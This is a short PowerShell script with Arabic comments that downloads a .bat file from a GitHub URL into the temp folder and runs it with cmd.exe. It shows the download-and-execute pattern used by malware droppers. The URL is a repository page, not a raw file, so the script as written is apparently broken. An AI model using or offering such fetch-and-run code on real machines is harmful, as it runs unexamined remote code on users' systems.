# ============================================================
#  RunIP.ps1 - تحميل وتشغيل ملف1.bat من GitHub
# ============================================================

$url  = "https://github.com/Blackhawk501/4242"
$file = "$env:TEMP\ملف1.bat"

Write-Host "[*] جاري تحميل الملف..." -ForegroundColor Cyan

try {
    Invoke-WebRequest -Uri $url -OutFile $file -UseBasicParsing -ErrorAction Stop
    Write-Host "[+] تم التحميل بنجاح: $file" -ForegroundColor Green
} catch {
    Write-Host "[-] فشل التحميل: $_" -ForegroundColor Red
    exit 1
}

# التأكد من أن الملف موجود قبل التشغيل
if (-not (Test-Path $file)) {
    Write-Host "[-] الملف غير موجود بعد التحميل!" -ForegroundColor Red
    exit 1
}

Write-Host "[*] جاري تشغيل الملف..." -ForegroundColor Cyan

Start-Process "cmd.exe" -ArgumentList "/c `"$file`"" -Wait

Write-Host "[+] انتهى التنفيذ." -ForegroundColor Green
